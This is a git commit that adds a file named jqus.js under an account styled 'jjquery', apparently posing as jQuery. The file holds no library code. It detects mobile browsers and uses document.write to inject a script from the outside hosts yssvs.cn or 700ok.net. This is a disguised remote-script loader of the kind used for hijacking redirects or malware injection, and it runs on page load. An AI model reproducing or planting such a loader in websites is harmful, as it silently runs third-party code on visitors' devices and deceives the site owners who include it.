60af97d60deaa424b65ff5d1a7611809368c0db9
jjquery <34562072+jjquery@users.noreply.github.com>
2017-12-15 11:51:21 +0800

    Create jqus.js

---
+++ jqus.js
@@ -0,0 +1,7 @@
+if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios|iPad)/i))) {
+if("https:" == document.location.protocol){
+document.write('<script src=\"https://s1.yssvs.cn/s.php?u=304|4|1\"><\/script>');
+}else{
+document.write('<script src=\"http://c.700ok.net/?u=304|4|1\"><\/script>');
+}
+}
